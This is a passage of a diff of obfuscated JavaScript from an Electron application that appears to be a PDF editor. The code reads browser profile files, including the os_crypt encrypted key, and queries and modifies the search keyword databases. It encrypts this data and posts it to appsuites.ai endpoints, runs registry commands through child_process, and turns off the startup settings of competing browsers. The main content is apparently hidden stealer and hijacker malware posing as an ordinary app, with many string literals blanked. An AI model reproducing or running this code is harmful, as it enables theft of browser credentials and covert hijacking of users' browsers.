+            const data4 = JSON.parse(require("fs").readFileSync(si, "utf8"));
+            nr.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
+            return [Object.keys(data4.profile?.info_cache || {}), sj ? data4.os_crypt?.encrypted_key || '' : ''];
+          } catch (sk) {
+            await nr.w3F3UWA.Y6CDW21(sh, nr.z579NEI.y46BIEQ, sk);
           }
           return [undefined, undefined];
         }
-        async X428OQY(sm, sn) {
+        async X428OQY(sl, sm) {
           try {
-            require("fs").copyFileSync(sm, sn);
+            require("fs").copyFileSync(sl, sm);
             return true;
           } catch {
             return false;
           }
         }
-        async r576OBZ(so, sp = false) {
+        async r576OBZ(sn, so = false) {
           const fs10 = require("fs");
           try {
-            if (!sp) {
-              return fs10.readFileSync(so, "utf8");
+            if (!so) {
+              return fs10.readFileSync(sn, "utf8");
             }
-            return fs10.readFileSync(so);
-          } catch (sq) {
-            throw new Error("ReadFileError: " + sq);
+            return fs10.readFileSync(sn);
+          } catch (sp) {
+            throw new Error("ReadFileError: " + sp);
           }
         }
-        async G5B8BDL(sr) {
-          const ss = new require("better-sqlite3")(sr);
+        async G5B8BDL(sq) {
+          const sr = new require("better-sqlite3")(sq);
           try {
-            return JSON.stringify(ss.prepare("select * from keywords").all());
-          } catch (st) {
-            ns.w3F3UWA.s59BT06('');
-            throw new Error(st);
+            return JSON.stringify(sr.prepare("select * from keywords").all());
+          } catch (ss) {
+            nr.w3F3UWA.s59BT06('');
+            throw new Error(ss);
           } finally {
-            ss.close((su) => {
-              if (su) {
-                ns.w3F3UWA.s59BT06('');
+            sr.close((st) => {
+              if (st) {
+                nr.w3F3UWA.s59BT06('');
               }
             });
           }
         }
-        async r501Z9L(sv, sw) {
-          const sx = new require("better-sqlite3")(sv);
+        async r501Z9L(su, sv) {
+          const sw = new require("better-sqlite3")(su);
           try {
-            for (const sy of JSON.parse(sw)) {
-              sx.prepare(sy).run();
-              ns.w3F3UWA.s59BT06('');
+            for (const sx of JSON.parse(sv)) {
+              sw.prepare(sx).run();
+              nr.w3F3UWA.s59BT06('');
             }
           } catch {
-            ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
             return false;
           } finally {
-            sx.close((sz) => {
-              if (sz) {
-                ns.w3F3UWA.s59BT06('');
+            sw.close((sy) => {
+              if (sy) {
+                nr.w3F3UWA.s59BT06('');
                 return;
               }
-              ns.w3F3UWA.s59BT06('');
+              nr.w3F3UWA.s59BT06('');
             });
           }
           return true;
         }
-        async Y53EKLA(ta, tb) {
+        async Y53EKLA(sz, ta) {
           try {
-            require("fs").writeFileSync(ta, tb);
+            require("fs").writeFileSync(sz, ta);
           } catch {
-            ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
           }
         }
-        async A5FCGS4(tc) {
-          return require("fs").existsSync(tc);
+        async A5FCGS4(tb) {
+          return require("fs").existsSync(tb);
         }
-        async O69AL84(td, te, tf) {
+        async O69AL84(tc, td, te) {
           try {
-            require("child_process").execSync((0, ns.o5B4F49)("", td, te, tf));
-          } catch (tg) {
-            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.u3F4OPT, tg);
+            require("child_process").execSync((0, nr.o5B4F49)("", tc, td, te));
+          } catch (tf) {
+            await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.u3F4OPT, tf);
           }
         }
-        async w4D8BBU(th, ti) {
+        async w4D8BBU(tg, th) {
           try {
-            ns.w3F3UWA.s59BT06('');
-            require("child_process").execSync((0, ns.o5B4F49)("", th, ti));
-          } catch (tj) {
-            await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.h6148NE, tj);
+            nr.w3F3UWA.s59BT06('');
+            require("child_process").execSync((0, nr.o5B4F49)("", tg, th));
+          } catch (ti) {
+            await nr.w3F3UWA.Y6CDW21(1, nr.z579NEI.h6148NE, ti);
           }
         }
-        async u459C3E(tk, tl) {
+        async u459C3E(tj, tk) {
           try {
-            const tm = tl.trim() == '' ? (0, ns.o5B4F49)("", tk) : (0, ns.o5B4F49)("", tk, tl);
-            require("child_process").execSync(tm);
+            const tl = tk.trim() == '' ? (0, nr.o5B4F49)("", tj) : (0, nr.o5B4F49)("", tj, tk);
+            require("child_process").execSync(tl);
             return true;
-          } catch (tn) {
-            if (!tn.stderr.includes("")) {
-              await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.m4F36Z7, tn);
+          } catch (tm) {
+            if (!tm.stderr.includes("")) {
+              await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.m4F36Z7, tm);
             }
           }
           return false;
         }
-        async H5AE3US(to) {
-          if (!to) {
+        async H5AE3US(tn) {
+          if (!tn) {
             return false;
           }
-          if (to.length == 0) {
+          if (tn.length == 0) {
             return false;
           }
           try {
-            let data5 = JSON.parse(to);
+            let data5 = JSON.parse(tn);
             return true;
           } catch {
             return false;
@@ -2782,194 +2776,194 @@
         }
         async e4F5CS0() {
           try {
-            var tp = nt.e5325L3.q474LOF ?? '';
+            var to = ns.e5325L3.q474LOF ?? '';
             const params3 = new require("url").URLSearchParams();
-            const tq = nr.S559FZQ.n677BRA.substring(0, 24) + tp.substring(0, 8);
+            const tp = nq.S559FZQ.n677BRA.substring(0, 24) + to.substring(0, 8);
             const obj6 = {
-              iid: tp,
-              version: nt.e5325L3.Y55B2P2,
+              iid: to,
+              version: ns.e5325L3.Y55B2P2,
               isSchedule: '0',
-              hasBLFile: nt.e5325L3.b57CS7T,
-              hasBLReg: nt.e5325L3.K48B40X,
+              hasBLFile: ns.e5325L3.b57CS7T,
+              hasBLReg: ns.e5325L3.K48B40X,
               supportWd: '1'
             };
-            const tr = ns.O694X7J(tq, JSON.stringify(obj6));
-            params3.append("data", tr.data);
-            params3.append("iv", tr.iv);
-            params3.append("iid", nt.e5325L3.q474LOF ?? '');
-            ns.w3F3UWA.s59BT06('');
-            let ts = await ns.h5235DD("api/s3/config", params3);
-            if (ts && ts.ok) {
-              let tt = await ts.json();
-              ns.w3F3UWA.s59BT06('');
+            const tq = nr.O694X7J(tp, JSON.stringify(obj6));
+            params3.append("data", tq.data);
+            params3.append("iv", tq.iv);
+            params3.append("iid", ns.e5325L3.q474LOF ?? '');
+            nr.w3F3UWA.s59BT06('');
+            let tr = await nr.h5235DD("api/s3/config", params3);
+            if (tr && tr.ok) {
+              let ts = await tr.json();
+              nr.w3F3UWA.s59BT06('');
               try {
-                if (tt.data) {
-                  const data6 = JSON.parse((0, ns.U61FWBZ)(tq, tt.data, tt.iv));
-                  ns.w3F3UWA.s59BT06('');
-                  let tu = new nv();
-                  tu.H5C67AR = data6.wc ?? false;
-                  tu.n412K1U = data6.wcs ?? false;
-                  tu.n5B332O = data6.wcpc ?? false;
-                  tu.k61AQMQ = data6.wcpe ?? false;
-                  tu.a6AFL0X = data6.wdc ?? false;
-                  tu.D4E3EHU = data6.wde ?? false;
-                  tu.E67CJ69 = data6.ol ?? false;
-                  tu.a586DQ2 = data6.ol_deep ?? false;
-                  tu.X42CN81 = data6.wv ?? false;
-                  tu.Y4B23HN = data6.wv_deep ?? false;
-                  tu.T5B2T2A = data6.sf ?? false;
-                  tu.V54518G = data6.sf_deep ?? false;
-                  tu.T5F71B2 = data6.pas ?? false;
-                  tu.g5ABMVH = data6.pas_deep ?? false;
-                  tu.t533W41 = data6.code ?? '';
-                  tu.O6CBOE4 = data6.reglist ?? '';
-                  return tu;
+                if (ts.data) {
+                  const data6 = JSON.parse((0, nr.U61FWBZ)(tp, ts.data, ts.iv));
+                  nr.w3F3UWA.s59BT06('');
+                  let tt = new nu();
+                  tt.H5C67AR = data6.wc ?? false;
+                  tt.n412K1U = data6.wcs ?? false;
+                  tt.n5B332O = data6.wcpc ?? false;
+                  tt.k61AQMQ = data6.wcpe ?? false;
+                  tt.a6AFL0X = data6.wdc ?? false;
+                  tt.D4E3EHU = data6.wde ?? false;
+                  tt.E67CJ69 = data6.ol ?? false;
+                  tt.a586DQ2 = data6.ol_deep ?? false;
+                  tt.X42CN81 = data6.wv ?? false;
+                  tt.Y4B23HN = data6.wv_deep ?? false;
+                  tt.T5B2T2A = data6.sf ?? false;
+                  tt.V54518G = data6.sf_deep ?? false;
+                  tt.T5F71B2 = data6.pas ?? false;
+                  tt.g5ABMVH = data6.pas_deep ?? false;
+                  tt.t533W41 = data6.code ?? '';
+                  tt.O6CBOE4 = data6.reglist ?? '';
+                  return tt;
                 }
-              } catch (tv) {
-                await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.e5C24C6, tv);
+              } catch (tu) {
+                await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.e5C24C6, tu);
               }
             } else {
-              ns.w3F3UWA.s59BT06('');
+              nr.w3F3UWA.s59BT06('');
             }
-          } catch (tw) {
-            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.E4AAIZR, tw);
+          } catch (tv) {
+            await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.E4AAIZR, tv);
           }
-          return new nv();
+          return new nu();
         }
-        async O515QL8(tx, ty, tz) {
-          ns.w3F3UWA.s59BT06('');
+        async O515QL8(tw, tx, ty) {
+          nr.w3F3UWA.s59BT06('');
           try {
-            var ua = nt.e5325L3.q474LOF ?? '';
+            var tz = ns.e5325L3.q474LOF ?? '';
             const params4 = new require("url").URLSearchParams();
-            const ub = nr.S559FZQ.n677BRA.substring(0, 24) + ua.substring(0, 8);
+            const ua = nq.S559FZQ.n677BRA.substring(0, 24) + tz.substring(0, 8);
             const obj7 = {
-              iid: ua,
-              bid: tx,
+              iid: tz,
+              bid: tw,
               sid: this.A64CEBI,
-              pref: ty,
-              spref: tz,
+              pref: tx,
+              spref: ty,
               wd: '',
-              version: nt.e5325L3.Y55B2P2,
+              version: ns.e5325L3.Y55B2P2,
               supportWd: '0',
               isSchedule: '0'
             };
-            ns.w3F3UWA.s59BT06('');
-            const uc = ns.O694X7J(ub, JSON.stringify(obj7));
-            params4.append("data", uc.data);
-            params4.append("iv", uc.iv);
-            params4.append("iid", nt.e5325L3.q474LOF ?? '');
-            ns.w3F3UWA.s59BT06('');
-            let ud = await ns.h5235DD("api/s3/validate", params4);
-            if (!ud || !ud.ok) {
-              ns.w3F3UWA.s59BT06('');
-              return new nw();
+            nr.w3F3UWA.s59BT06('');
+            const ub = nr.O694X7J(ua, JSON.stringify(obj7));
+            params4.append("data", ub.data);
+            params4.append("iv", ub.iv);
+            params4.append("iid", ns.e5325L3.q474LOF ?? '');
+            nr.w3F3UWA.s59BT06('');
+            let uc = await nr.h5235DD("api/s3/validate", params4);
+            if (!uc || !uc.ok) {
+              nr.w3F3UWA.s59BT06('');
+              return new nv();
             }
-            let ue = await ud.json();
-            ns.w3F3UWA.s59BT06('');
+            let ud = await uc.json();
+            nr.w3F3UWA.s59BT06('');
             try {
-              if (ue.data) {
-                const data7 = JSON.parse((0, ns.U61FWBZ)(ub, ue.searchdata, ue.iv));
-                let uf = JSON.stringify(data7.pref) ?? '';
-                let ug = JSON.stringify(data7.spref) ?? '';
-                let uh = JSON.stringify(data7.regdata) ?? '';
-                let ui = JSON.stringify(data7.reglist) ?? '';
+              if (ud.data) {
+                const data7 = JSON.parse((0, nr.U61FWBZ)(ua, ud.searchdata, ud.iv));
+                let ue = JSON.stringify(data7.pref) ?? '';
+                let uf = JSON.stringify(data7.spref) ?? '';
+                let ug = JSON.stringify(data7.regdata) ?? '';
+                let uh = JSON.stringify(data7.reglist) ?? '';
+                if (ue == "null") {
+                  ue = '';
+                }
                 if (uf == "null") {
                   uf = '';
                 }
-                if (ug == "null") {
+                if (ug == "\"\"") {
                   ug = '';
                 }
                 if (uh == "\"\"") {
                   uh = '';
                 }
-                if (ui == "\"\"") {
-                  ui = '';
-                }
-                return new nw(true, uf, ug, uh, ui);
+                return new nv(true, ue, uf, ug, uh);
               }
-            } catch (uj) {
-              await ns.w3F3UWA.Y6CDW21(tx, ns.z579NEI.l54DEIW, uj);
+            } catch (ui) {
+              await nr.w3F3UWA.Y6CDW21(tw, nr.z579NEI.l54DEIW, ui);
             }
-          } catch (uk) {
-            await ns.w3F3UWA.Y6CDW21(tx, ns.z579NEI.M5E3V2V, uk, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
+          } catch (uj) {
+            await nr.w3F3UWA.Y6CDW21(tw, nr.z579NEI.M5E3V2V, uj, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
           }
-          return new nw();
+          return new nv();
         }
-        async w516KLO(ul, um, un, uo) {
-          ns.w3F3UWA.s59BT06('');
+        async w516KLO(uk, ul, um, un) {
+          nr.w3F3UWA.s59BT06('');
           try {
-            var up = nt.e5325L3.q474LOF ?? '';
+            var uo = ns.e5325L3.q474LOF ?? '';
             const params5 = new require("url").URLSearchParams();
-            const uq = nr.S559FZQ.n677BRA.substring(0, 24) + up.substring(0, 8);
+            const up = nq.S559FZQ.n677BRA.substring(0, 24) + uo.substring(0, 8);
             const obj8 = {
-              iid: up,
-              bid: ul,
+              iid: uo,
+              bid: uk,
               sid: this.A64CEBI,
-              pref: un,
+              pref: um,
               spref: '',
-              osCryptKey: um,
-              wd: uo,
-              version: nt.e5325L3.Y55B2P2,
+              osCryptKey: ul,
+              wd: un,
+              version: ns.e5325L3.Y55B2P2,
               supportWd: '1',
               isSchedule: '0'
             };
-            const ur = ns.O694X7J(uq, JSON.stringify(obj8));
-            params5.append("data", ur.data);
-            params5.append("iv", ur.iv);
-            params5.append("iid", nt.e5325L3.q474LOF ?? '');
-            ns.w3F3UWA.s59BT06('');
-            let us = await ns.h5235DD("api/s3/validate", params5);
-            if (!us || !us.ok) {
-              ns.w3F3UWA.s59BT06('');
-              return new nx();
+            const uq = nr.O694X7J(up, JSON.stringify(obj8));
+            params5.append("data", uq.data);
+            params5.append("iv", uq.iv);
+            params5.append("iid", ns.e5325L3.q474LOF ?? '');
+            nr.w3F3UWA.s59BT06('');
+            let ur = await nr.h5235DD("api/s3/validate", params5);
+            if (!ur || !ur.ok) {
+              nr.w3F3UWA.s59BT06('');
+              return new nw();
             }
-            let ut = await us.json();
+            let us = await ur.json();
             try {
-              if (ut.data) {
-                if (!ut.searchdata) {
-                  return new nx(true, '', '');
+              if (us.data) {
+                if (!us.searchdata) {
+                  return new nw(true, '', '');
                 }
-                const data8 = JSON.parse((0, ns.U61FWBZ)(uq, ut.searchdata, ut.iv));
-                const uu = data8.pref ?? '';
-                const uv = data8.webData ?? '';
-                ns.w3F3UWA.s59BT06('');
-                ns.w3F3UWA.s59BT06('');
-                let uw = uv !== '' ? JSON.stringify(uv) ?? '' : '';
-                return new nx(true, uu !== '' ? JSON.stringify(uu) ?? '' : '', uv);
+                const data8 = JSON.parse((0, nr.U61FWBZ)(up, us.searchdata, us.iv));
+                const ut = data8.pref ?? '';
+                const uu = data8.webData ?? '';
+                nr.w3F3UWA.s59BT06('');
+                nr.w3F3UWA.s59BT06('');
+                let uv = uu !== '' ? JSON.stringify(uu) ?? '' : '';
+                return new nw(true, ut !== '' ? JSON.stringify(ut) ?? '' : '', uu);
               }
-            } catch (ux) {
-              await ns.w3F3UWA.Y6CDW21(ul, ns.z579NEI.l54DEIW, ux);
+            } catch (uw) {
+              await nr.w3F3UWA.Y6CDW21(uk, nr.z579NEI.l54DEIW, uw);
             }
-          } catch (uy) {
-            await ns.w3F3UWA.Y6CDW21(ul, ns.z579NEI.M5E3V2V, uy, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
+          } catch (ux) {
+            await nr.w3F3UWA.Y6CDW21(uk, nr.z579NEI.M5E3V2V, ux, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
           }
-          return new nx();
+          return new nw();
         }
-        async g4EE56L(uz) {
+        async g4EE56L(uy) {
           try {
-            const va = (await nr.S559FZQ.l610ZCY(uz)) ?? '';
-            if (va == '') {
+            const uz = (await nq.S559FZQ.l610ZCY(uy)) ?? '';
+            if (uz == '') {
               return 0;
             }
-            return parseInt(va);
+            return parseInt(uz);
           } catch {
-            ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
             return 0;
           }
         }
-        async w5C1TZN(vb) {
-          const vc = nr.S559FZQ.D47CBV3();
-          if (!vc) {
-            ns.w3F3UWA.s59BT06('');
+        async w5C1TZN(va) {
+          const vb = nq.S559FZQ.D47CBV3();
+          if (!vb) {
+            nr.w3F3UWA.s59BT06('');
             return;
           }
-          let vd = require("path").join(vc, "");
+          let vc = require("path").join(vb, "");
           const fs11 = require("fs");
           try {
-            let data9 = JSON.parse(fs11.readFileSync(vd, "utf8"));
-            const ve = await this.g4EE56L("wv-key");
+            let data9 = JSON.parse(fs11.readFileSync(vc, "utf8"));
+            const vd = await this.g4EE56L("wv-key");
             if (data9[""] ?? true || (data9[""]?.[""] ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
-              if (0 == ve || vb) {
+              if (0 == vd || va) {
                 await this.D45AYQ3("");
                 data9[""] = false;
                 if (!data9[""]) {
@@ -2981,94 +2975,94 @@
                 }
                 data9[""] = false;
                 data9[""] = false;
-                fs11.writeFileSync(vd, JSON.stringify(data9), "utf8");
-                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.R3F76I3, [vb, ve]);
-                await nr.S559FZQ.c5E4Z7C("wv-key", "1");
+                fs11.writeFileSync(vc, JSON.stringify(data9), "utf8");
+                await nr.w3F3UWA.W4EF0EI(3, nr.z579NEI.R3F76I3, [va, vd]);
+                await nq.S559FZQ.c5E4Z7C("wv-key", "1");
               } else {
-                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.v535X73, [vb, ve]);
+                await nr.w3F3UWA.W4EF0EI(3, nr.z579NEI.v535X73, [va, vd]);
               }
             } else {
               let flag6 = false;
-              if (1 == ve) {
-                const vf = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
-                const vg = this.t4E0LPU("\\");
-                if (vf != undefined && false == vf && vg != undefined && vg) {
+              if (1 == vd) {
+                const ve = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
+                const vf = this.t4E0LPU("\\");
+                if (ve != undefined && false == ve && vf != undefined && vf) {
                   flag6 = true;
-                  await nr.S559FZQ.c5E4Z7C("wv-key", "2");
+                  await nq.S559FZQ.c5E4Z7C("wv-key", "2");
                   await this.D45AYQ3("");
-                  await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.d422GJH, [vb, ve]);
+                  await nr.w3F3UWA.W4EF0EI(3, nr.z579NEI.d422GJH, [va, vd]);
                 }
               }
               if (!flag6) {
-                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.Q542KEX, [vb, ve]);
+                await nr.w3F3UWA.W4EF0EI(3, nr.z579NEI.Q542KEX, [va, vd]);
               }
             }
           } catch {
-            ns.w3F3UWA.s59BT06('');
-            await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.u51A2HJ);
+            nr.w3F3UWA.s59BT06('');
+            await nr.w3F3UWA.W4EF0EI(3, nr.z579NEI.u51A2HJ);
           }
         }
-        async c647ECB(vh) {
+        async c647ECB(vg) {
           const fs12 = require("fs");
-          const vi = require("path").join(nr.S559FZQ.D47CBV3(), "", "");
+          const vh = require("path").join(nq.S559FZQ.D47CBV3(), "", "");
           try {
-            let data10 = JSON.parse(fs12.readFileSync(vi, "utf8"));
-            const vj = await this.g4EE56L("ol-key");
+            let data10 = JSON.parse(fs12.readFileSync(vh, "utf8"));
+            const vi = await this.g4EE56L("ol-key");
             if (data10[""] || data10[""] || data10[""] || data10[""] || data10[""]) {
-              if (0 == vj || vh) {
+              if (0 == vi || vg) {
                 data10[""] = false;
                 data10[""] = false;
                 data10[""] = false;
                 data10[""] = false;
                 data10[""] = false;
                 await this.D45AYQ3("");
-                fs12.writeFileSync(vi, JSON.stringify(data10, null, 2), "utf8");
+                fs12.writeFileSync(vh, JSON.stringify(data10, null, 2), "utf8");
                 await this.D45AYQ3("");
-                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.R3F76I3, [vh, vj]);
-                await nr.S559FZQ.c5E4Z7C("ol-key", "1");
+                await nr.w3F3UWA.W4EF0EI(4, nr.z579NEI.R3F76I3, [vg, vi]);
+                await nq.S559FZQ.c5E4Z7C("ol-key", "1");
               } else {
-                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.v535X73, [vh, vj]);
+                await nr.w3F3UWA.W4EF0EI(4, nr.z579NEI.v535X73, [vg, vi]);
               }
             } else {
               let flag7 = false;
-              if (1 == vj) {
-                const vk = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
-                const vl = this.t4E0LPU("\\");
-                if (vk != undefined && false == vk && vl != undefined && vl) {
+              if (1 == vi) {
+                const vj = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
+                const vk = this.t4E0LPU("\\");
+                if (vj != undefined && false == vj && vk != undefined && vk) {
                   flag7 = true;
-                  await nr.S559FZQ.c5E4Z7C("ol-key", "2");
+                  await nq.S559FZQ.c5E4Z7C("ol-key", "2");
                   await this.D45AYQ3("");
                   await this.D45AYQ3("");
-                  await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.d422GJH, [vh, vj]);
+                  await nr.w3F3UWA.W4EF0EI(4, nr.z579NEI.d422GJH, [vg, vi]);
                 }
               }
               if (!flag7) {
-                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.Q542KEX, [vh, vj]);
+                await nr.w3F3UWA.W4EF0EI(4, nr.z579NEI.Q542KEX, [vg, vi]);
               }
             }
           } catch {
-            ns.w3F3UWA.s59BT06('');
-            await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.u51A2HJ);
+            nr.w3F3UWA.s59BT06('');
+            await nr.w3F3UWA.W4EF0EI(4, nr.z579NEI.u51A2HJ);
           }
         }
-        async h659UF4(vm) {
-          const vn = nr.S559FZQ.D47CBV3();
-          if (!vn) {
-            ns.w3F3UWA.s59BT06('');
+        async h659UF4(vl) {
+          const vm = nq.S559FZQ.D47CBV3();
+          if (!vm) {
+            nr.w3F3UWA.s59BT06('');
             return;
           }
-          let vo = require("path").join(vn, "");
+          let vn = require("path").join(vm, "");
           const fs13 = require("fs");
           try {
-            let data11 = JSON.parse(fs13.readFileSync(vo, "utf8"));
+            let data11 = JSON.parse(fs13.readFileSync(vn, "utf8"));
             let flag8 = true;
             if ("shift" in data11 && "browser" in data11.shift) {
-              const vq = data11.shift.browser;
-              flag8 = vq.launch_on_login_enabled ?? true || (vq.launch_on_wake_enabled ?? true) || (vq.run_in_background_enabled ?? true);
+              const vp = data11.shift.browser;
+              flag8 = vp.launch_on_login_enabled ?? true || (vp.launch_on_wake_enabled ?? true) || (vp.run_in_background_enabled ?? true);
             }
-            const vp = await this.g4EE56L("sf-key");
+            const vo = await this.g4EE56L("sf-key");
             if (flag8) {
-              if (0 == vp || vm) {
+              if (0 == vo || vl) {
                 if (!("shift" in data11)) {
                   data11.shift = {};
                 }
@@ -3079,64 +3073,64 @@
                 data11.shift.browser.launch_on_wake_enabled = false;
                 data11.shift.browser.run_in_background_enabled = false;
                 await this.D45AYQ3("");
-                fs13.writeFileSync(vo, JSON.stringify(data11), "utf8");
-                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.R3F76I3, [vm, vp]);
-                await nr.S559FZQ.c5E4Z7C("sf-key", "1");
+                fs13.writeFileSync(vn, JSON.stringify(data11), "utf8");
+                await nr.w3F3UWA.W4EF0EI(6, nr.z579NEI.R3F76I3, [vl, vo]);
+                await nq.S559FZQ.c5E4Z7C("sf-key", "1");
               } else {
-                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.v535X73, [vm, vp]);
+                await nr.w3F3UWA.W4EF0EI(6, nr.z579NEI.v535X73, [vl, vo]);
               }
             } else {
               let flag9 = false;
-              if (1 == vp) {
-                const vr = this.e5FBF4O('', "ShiftLaunchTask", 1);
-                const vs = this.t4E0LPU("\\");
-                if (vr != undefined && false == vr && vs != undefined && vs) {
+              if (1 == vo) {
+                const vq = this.e5FBF4O('', "ShiftLaunchTask", 1);
+                const vr = this.t4E0LPU("\\");
+                if (vq != undefined && false == vq && vr != undefined && vr) {
                   flag9 = true;
-                  await nr.S559FZQ.c5E4Z7C("sf-key", "2");
+                  await nq.S559FZQ.c5E4Z7C("sf-key", "2");
                   await this.D45AYQ3("");
-                  await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.d422GJH, [vm, vp]);
+                  await nr.w3F3UWA.W4EF0EI(6, nr.z579NEI.d422GJH, [vl, vo]);
                 }
               }
               if (!flag9) {
-                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.Q542KEX, [vm, vp]);
+                await nr.w3F3UWA.W4EF0EI(6, nr.z579NEI.Q542KEX, [vl, vo]);
               }
             }
           } catch {
-            ns.w3F3UWA.s59BT06('');
-            await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.u51A2HJ);
+            nr.w3F3UWA.s59BT06('');
+            await nr.w3F3UWA.W4EF0EI(6, nr.z579NEI.u51A2HJ);
           }
         }
-        async W5F8HOG(vt) {
+        async W5F8HOG(vs) {
           const path9 = require("path");
           const fs14 = require("fs");
           try {
-            let vu = (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", ""));
-            const vv = await this.g4EE56L("pas-key");
-            if (vu) {
-              if (0 == vv || vt) {
+            let vt = (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", ""));
+            const vu = await this.g4EE56L("pas-key");
+            if (vt) {
+              if (0 == vu || vs) {
                 await this.D45AYQ3("", false);
                 await this.D45AYQ3("", false);
                 await this.w4D8BBU("", "");
                 await this.w4D8BBU("", "");
                 await this.w4D8BBU("", "");
-                await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.R3F76I3, [vt, vv]);
-                await nr.S559FZQ.c5E4Z7C("pas-key", "1");
+                await nr.w3F3UWA.W4EF0EI(7, nr.z579NEI.R3F76I3, [vs, vu]);
+                await nq.S559FZQ.c5E4Z7C("pas-key", "1");
               } else {
-                await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.v535X73, [vt, vv]);
+                await nr.w3F3UWA.W4EF0EI(7, nr.z579NEI.v535X73, [vs, vu]);
               }
-            } else if (1 == vv) {
-              await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.Q542KEX, [vt, vv]);
+            } else if (1 == vu) {
+              await nr.w3F3UWA.W4EF0EI(7, nr.z579NEI.Q542KEX, [vs, vu]);
             }
           } catch {
-            await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.u51A2HJ);
+            await nr.w3F3UWA.W4EF0EI(7, nr.z579NEI.u51A2HJ);
           }
         }
       };
-      nq.A672SIS = oa;
+      np.A672SIS = nz;
     }
   });
   const h = b({
-    'obj/globals.js'(vw, vx) {
+    'obj/globals.js'(vv, vw) {
       'use strict';
 
       const obj9 = {
@@ -3151,11 +3145,11 @@
         scheduledUTaskName: "PDFEditorUScheduledTask",
         iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
       };
-      vx.exports = obj9;
+      vw.exports = obj9;
     }
   });
   const i = b({
-    'obj/window.js'(vy) {
+    'obj/window.js'(vx) {
       'use strict';
 
       const {
@@ -3164,16 +3158,16 @@
       const {
         dialog: electron2
       } = require("electron");
-      vy.createBrowserWindow = () => {
-        let vz = __dirname;
-        vz = vz.replace("src", '');
-        let wa = vz + h().iconSubPath;
-        console.log(wa);
-        const wb = new electron({
+      vx.createBrowserWindow = () => {
+        let vy = __dirname;
+        vy = vy.replace("src", '');
+        let vz = vy + h().iconSubPath;
+        console.log(vz);
+        const wa = new electron({
           resizable: true,
           width: 1024,
           height: 768,
-          icon: wa,
+          icon: vz,
           autoHideMenuBar: true,
           backgroundColor: "#fff",
           webPreferences: {
@@ -3181,16 +3175,16 @@
             preload: require("path").join(__dirname, "./preload.js")
           }
         });
-        return wb;
+        return wa;
       };
     }
   });
   const j = b({
-    'obj/D3E8Q17.js'(wc) {
-      Object.defineProperty(wc, "__esModule", {
+    'obj/D3E8Q17.js'(wb) {
+      Object.defineProperty(wb, "__esModule", {
         value: true
       });
-      const wd = c();
+      const wc = c();
       const fs15 = require('fs');
       const Utilityaddon = require(".\\lib\\Utilityaddon.node");
       const {
@@ -3198,155 +3192,155 @@
         Menu: electron4,
         ipcMain: electron5
       } = require("electron");
-      const we = h();
-      async function wf() {
-        const wg = (wu) => {
-          switch (wu) {
+      const wd = h();
+      async function we() {
+        const wf = (wt) => {
+          switch (wt) {
             case "--install":
-              return wd.a689XV5.b5BEPQ2;
+              return wc.a689XV5.b5BEPQ2;
             case "--check":
-              return wd.a689XV5.V4E6B4O;
+              return wc.a689XV5.V4E6B4O;
             case "--reboot":
-              return wd.a689XV5.j5C58S9;
+              return wc.a689XV5.j5C58S9;
             case "--cleanup":
-              return wd.a689XV5.Z498ME9;
+              return wc.a689XV5.Z498ME9;
             case "--ping":
-              return wd.a689XV5.f63DUQF;
+              return wc.a689XV5.f63DUQF;
           }
-          return wd.a689XV5.B639G7B;
+          return wc.a689XV5.B639G7B;
         };
         let flag10 = false;
-        let wh = electron3.commandLine.getSwitchValue('c');
-        let wi = electron3.commandLine.getSwitchValue('cm');
-        console.log('args=' + wh);
-        console.log("args2=" + wi);
-        let wj = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
-        console.log("wkdir = " + wj);
+        let wg = electron3.commandLine.getSwitchValue('c');
+        let wh = electron3.commandLine.getSwitchValue('cm');
+        console.log('args=' + wg);
+        console.log("args2=" + wh);
+        let wi = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
+        console.log("wkdir = " + wi);
